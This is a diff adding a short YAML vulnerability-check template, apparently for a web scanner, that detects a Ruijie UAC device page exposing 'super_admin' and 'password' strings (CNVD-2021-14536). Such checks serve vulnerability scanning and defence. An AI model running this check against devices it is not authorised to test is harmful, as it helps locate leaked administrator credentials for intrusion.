@@ -1,0 +1,11 @@
+name: poc-yaml-ruijie-uac-cnvd-2021-14536
+rules:
+  - method: GET
+    path: /
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"super_admin") && response.body.bcontains(b"password")
+detail:
+  author: B1anda0(https://github.com/B1anda0)
+  links:
+    - https://www.cnblogs.com/cHr1s/p/14499858.html
